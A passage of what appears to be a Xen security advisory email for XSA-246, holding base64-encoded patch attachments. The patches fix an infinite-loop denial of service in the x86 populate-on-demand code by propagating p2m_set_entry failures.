+YWJvdmUgZm9yIHdoeSBhIHNpbmdsZSBjYWxsIHN1ZmZpY2VzLgorICAgICAq
+CisgICAgICogTk9URTogSW4gYSBwMm0gZmluZS1ncmFpbmVkIGxvY2sgc2Nl
+bmFyaW8gdGhpcyBtaWdodAorICAgICAqIG5lZWQgcHJvbW90aW5nIHRoZSBn
+Zm4gbG9jayBmcm9tIGdmbi0+Mk0gc3VwZXJwYWdlLgorICAgICAqLwogICAg
+IGdmbl9hbGlnbmVkID0gKGdmbj4+b3JkZXIpPDxvcmRlcjsKLSAgICBmb3Io
+aT0wOyBpPCgxPDxvcmRlcik7IGkrKykKLSAgICAgICAgcDJtX3NldF9lbnRy
+eShwMm0sIGdmbl9hbGlnbmVkICsgaSwgX21mbihJTlZBTElEX01GTiksIFBB
+R0VfT1JERVJfNEssCi0gICAgICAgICAgICAgICAgICAgICAgcDJtX3BvcHVs
+YXRlX29uX2RlbWFuZCwgcDJtLT5kZWZhdWx0X2FjY2Vzcyk7CisgICAgaWYg
+KCBwMm1fc2V0X2VudHJ5KHAybSwgZ2ZuX2FsaWduZWQsIF9tZm4oSU5WQUxJ
+RF9NRk4pLCBQQUdFX09SREVSXzRLLAorICAgICAgICAgICAgICAgICAgICAg
+ICBwMm1fcG9wdWxhdGVfb25fZGVtYW5kLCBwMm0tPmRlZmF1bHRfYWNjZXNz
+KSApCisgICAgICAgIHJldHVybiAtMTsKKwogICAgIGlmICggdGJfaW5pdF9k
+b25lICkKICAgICB7CiAgICAgICAgIHN0cnVjdCB7Cg==
+
+--=separator
+Content-Type: application/octet-stream; name="xsa246-4.9.patch"
+Content-Disposition: attachment; filename="xsa246-4.9.patch"
+Content-Transfer-Encoding: base64
+
+RnJvbTogSnVsaWVuIEdyYWxsIDxqdWxpZW4uZ3JhbGxAbGluYXJvLm9yZz4K
+U3ViamVjdDogeDg2L3BvZDogcHJldmVudCBpbmZpbml0ZSBsb29wIHdoZW4g
+c2hhdHRlcmluZyBsYXJnZSBwYWdlcwoKV2hlbiBwb3B1bGF0aW5nIHBhZ2Vz
+LCB0aGUgUG9EIG1heSBuZWVkIHRvIHNwbGl0IGxhcmdlIG9uZXMgdXNpbmcK
+cDJtX3NldF9lbnRyeSBhbmQgcmVxdWVzdCB0aGUgY2FsbGVyIHRvIHJldHJ5
+IChzZWUgZXB0X2dldF9lbnRyeSBmb3IKaW5zdGFuY2UpLgoKcDJtX3NldF9l
+bnRyeSBtYXkgZmFpbCB0byBzaGF0dGVyIGlmIGl0IGlzIG5vdCBwb3NzaWJs
+ZSB0byBhbGxvY2F0ZQptZW1vcnkgZm9yIHRoZSBuZXcgcGFnZSB0YWJsZS4g
+SG93ZXZlciwgdGhlIGVycm9yIGlzIG5vdCBwcm9wYWdhdGVkCnJlc3VsdGlu
+ZyB0byB0aGUgY2FsbGVycyB0byByZXRyeSBpbmZpbml0ZWx5IHRoZSBQb0Qu
+CgpQcmV2ZW50IHRoZSBpbmZpbml0ZSBsb29wIGJ5IHJldHVybiBmYWxzZSB3
+aGVuIGl0IGlzIG5vdCBwb3NzaWJsZSB0bwpzaGF0dGVyIHRoZSBsYXJnZSBt
+YXBwaW5nLgoKVGhpcyBpcyBYU0EtMjQ2LgoKU2lnbmVkLW9mZi1ieTogSnVs
+aWVuIEdyYWxsIDxqdWxpZW4uZ3JhbGxAbGluYXJvLm9yZz4KU2lnbmVkLW9m
+Zi1ieTogSmFuIEJldWxpY2ggPGpiZXVsaWNoQHN1c2UuY29tPgpSZXZpZXdl
+ZC1ieTogR2VvcmdlIER1bmxhcCA8Z2VvcmdlLmR1bmxhcEBjaXRyaXguY29t
+PgoKLS0tIGEveGVuL2FyY2gveDg2L21tL3AybS1wb2QuYworKysgYi94ZW4v
+YXJjaC94ODYvbW0vcDJtLXBvZC5jCkBAIC0xMDcxLDkgKzEwNzEsOCBAQCBw
+Mm1fcG9kX2RlbWFuZF9wb3B1bGF0ZShzdHJ1Y3QgcDJtX2RvbWFpCiAgICAg
+ICAgICAqIE5PVEU6IEluIGEgZmluZS1ncmFpbmVkIHAybSBsb2NraW5nIHNj
+ZW5hcmlvIHRoaXMgb3BlcmF0aW9uCiAgICAgICAgICAqIG1heSBuZWVkIHRv
+IHByb21vdGUgaXRzIGxvY2tpbmcgZnJvbSBnZm4tPjFnIHN1cGVycGFnZQog
+ICAgICAgICAgKi8KLSAgICAgICAgcDJtX3NldF9lbnRyeShwMm0sIGdmbl9h
+bGlnbmVkLCBJTlZBTElEX01GTiwgUEFHRV9PUkRFUl8yTSwKLSAgICAgICAg
+ICAgICAgICAgICAgICBwMm1fcG9wdWxhdGVfb25fZGVtYW5kLCBwMm0tPmRl
+ZmF1bHRfYWNjZXNzKTsKLSAgICAgICAgcmV0dXJuIDA7CisgICAgICAgIHJl
+dHVybiBwMm1fc2V0X2VudHJ5KHAybSwgZ2ZuX2FsaWduZWQsIElOVkFMSURf
+TUZOLCBQQUdFX09SREVSXzJNLAorICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICBwMm1fcG9wdWxhdGVfb25fZGVtYW5kLCBwMm0tPmRlZmF1bHRfYWNj
+ZXNzKTsKICAgICB9CiAKICAgICAvKiBPbmx5IHJlY2xhaW0gaWYgd2UncmUg
+aW4gYWN0dWFsIG5lZWQgb2YgbW9yZSBjYWNoZS4gKi8KQEAgLTExMDQsOCAr
+MTEwMywxMiBAQCBwMm1fcG9kX2RlbWFuZF9wb3B1bGF0ZShzdHJ1Y3QgcDJt
+X2RvbWFpCiAKICAgICBnZm5fYWxpZ25lZCA9IChnZm4gPj4gb3JkZXIpIDw8
+IG9yZGVyOwogCi0gICAgcDJtX3NldF9lbnRyeShwMm0sIGdmbl9hbGlnbmVk
+LCBtZm4sIG9yZGVyLCBwMm1fcmFtX3J3LAotICAgICAgICAgICAgICAgICAg
+cDJtLT5kZWZhdWx0X2FjY2Vzcyk7CisgICAgaWYgKCBwMm1fc2V0X2VudHJ5
+KHAybSwgZ2ZuX2FsaWduZWQsIG1mbiwgb3JkZXIsIHAybV9yYW1fcncsCisg
+ICAgICAgICAgICAgICAgICAgICAgIHAybS0+ZGVmYXVsdF9hY2Nlc3MpICkK
+KyAgICB7CisgICAgICAgIHAybV9wb2RfY2FjaGVfYWRkKHAybSwgcCwgb3Jk
+ZXIpOworICAgICAgICBnb3RvIG91dF9mYWlsOworICAgIH0KIAogICAgIGZv
+ciggaSA9IDA7IGkgPCAoMVVMIDw8IG9yZGVyKTsgaSsrICkKICAgICB7CkBA
+IC0xMTUwLDEzICsxMTUzLDE4IEBAIHJlbWFwX2FuZF9yZXRyeToKICAgICBC
+VUdfT04ob3JkZXIgIT0gUEFHRV9PUkRFUl8yTSk7CiAgICAgcG9kX3VubG9j
+ayhwMm0pOwogCi0gICAgLyogUmVtYXAgdGhpcyAyLW1lZyByZWdpb24gaW4g
+c2luZ2xldG9uIGNodW5rcyAqLwotICAgIC8qIE5PVEU6IEluIGEgcDJtIGZp
+bmUtZ3JhaW5lZCBsb2NrIHNjZW5hcmlvIHRoaXMgbWlnaHQKLSAgICAgKiBu
+ZWVkIHByb21vdGluZyB0aGUgZ2ZuIGxvY2sgZnJvbSBnZm4tPjJNIHN1cGVy
+cGFnZSAqLworICAgIC8qCisgICAgICogUmVtYXAgdGhpcyAyLW1lZyByZWdp
+b24gaW4gc2luZ2xldG9uIGNodW5rcy4gU2VlIHRoZSBjb21tZW50IG9uIHRo
+ZQorICAgICAqIDFHIHBhZ2Ugc3BsaXR0aW5nIHBhdGggYWJvdmUgZm9yIHdo
+eSBhIHNpbmdsZSBjYWxsIHN1ZmZpY2VzLgorICAgICAqCisgICAgICogTk9U
+RTogSW4gYSBwMm0gZmluZS1ncmFpbmVkIGxvY2sgc2NlbmFyaW8gdGhpcyBt
+aWdodAorICAgICAqIG5lZWQgcHJvbW90aW5nIHRoZSBnZm4gbG9jayBmcm9t
+IGdmbi0+Mk0gc3VwZXJwYWdlLgorICAgICAqLwogICAgIGdmbl9hbGlnbmVk
+ID0gKGdmbj4+b3JkZXIpPDxvcmRlcjsKLSAgICBmb3IoaT0wOyBpPCgxPDxv
+cmRlcik7IGkrKykKLSAgICAgICAgcDJtX3NldF9lbnRyeShwMm0sIGdmbl9h
+bGlnbmVkICsgaSwgSU5WQUxJRF9NRk4sIFBBR0VfT1JERVJfNEssCi0gICAg
+ICAgICAgICAgICAgICAgICAgcDJtX3BvcHVsYXRlX29uX2RlbWFuZCwgcDJt
+LT5kZWZhdWx0X2FjY2Vzcyk7CisgICAgaWYgKCBwMm1fc2V0X2VudHJ5KHAy
+bSwgZ2ZuX2FsaWduZWQsIElOVkFMSURfTUZOLCBQQUdFX09SREVSXzRLLAor
+ICAgICAgICAgICAgICAgICAgICAgICBwMm1fcG9wdWxhdGVfb25fZGVtYW5k
+LCBwMm0tPmRlZmF1bHRfYWNjZXNzKSApCisgICAgICAgIHJldHVybiAtMTsK
+KwogICAgIGlmICggdGJfaW5pdF9kb25lICkKICAgICB7CiAgICAgICAgIHN0
+cnVjdCB7Cg==
+
+--=separator--
